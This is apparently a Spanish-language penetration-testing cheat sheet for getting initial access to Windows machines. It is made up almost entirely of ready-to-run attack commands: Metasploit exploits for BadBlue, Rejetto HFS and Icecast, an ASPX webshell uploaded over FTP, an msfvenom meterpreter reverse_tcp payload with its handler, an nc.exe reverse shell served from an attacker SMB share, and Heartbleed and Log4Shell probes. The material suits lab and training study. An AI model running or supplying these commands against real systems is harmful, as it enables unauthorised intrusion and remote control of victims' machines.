# FOOTHOLD WINDOWS — HTTP, IIS y otros exploits

## BadBlue 2.7 / Rejetto HFS / Icecast
```bash
msfconsole -q -x "use exploit/windows/http/badblue_passthru; set RHOSTS <TARGET_IP>; set LHOST <LHOST>; run; exit -y"
msfconsole -q -x "use exploit/windows/http/rejetto_hfs_exec; set RHOSTS <TARGET_IP>; set LHOST <LHOST>; run; exit -y"
msfconsole -q -x "use exploit/windows/http/icecast_header; set RHOSTS <TARGET_IP>; set LHOST <LHOST>; run; exit -y"
```

## IIS + ASPX via FTP
```bash
find / -name cmdasp.aspx 2>/dev/null
cp /usr/share/webshells/aspx/cmdasp.aspx .
ftp <TARGET_IP>
put cmdasp.aspx
# Ejecutar en: http://<TARGET_IP>/cmdasp.aspx

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=444 -f aspx -o shell.aspx
ftp <TARGET_IP> && put shell.aspx
msfconsole -q -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT 444; run"
```

## SMB Share + nc.exe
```bash
cp /usr/share/windows-resources/binaries/nc.exe .
impacket-smbserver recurso $(pwd) -smb2support
sudo nc -nvlp 443
# En webshell: \\<ATTACKER_IP>\recurso\nc.exe -e cmd.exe <ATTACKER_IP> 443
```

## RDP
```bash
xfreerdp /u:<USER> /p:<PASSWORD> /v:<TARGET_IP>
net user && net localgroup Administrators
```

## Heartbleed / Log4j
```bash
nmap -sV --script ssl-heartbleed -p 443 <TARGET_IP>
nmap --script log4shell.nse --script-args log4shell.callback-server=<CALLBACK_IP>:1389 -p 8080 <TARGET_IP>
```
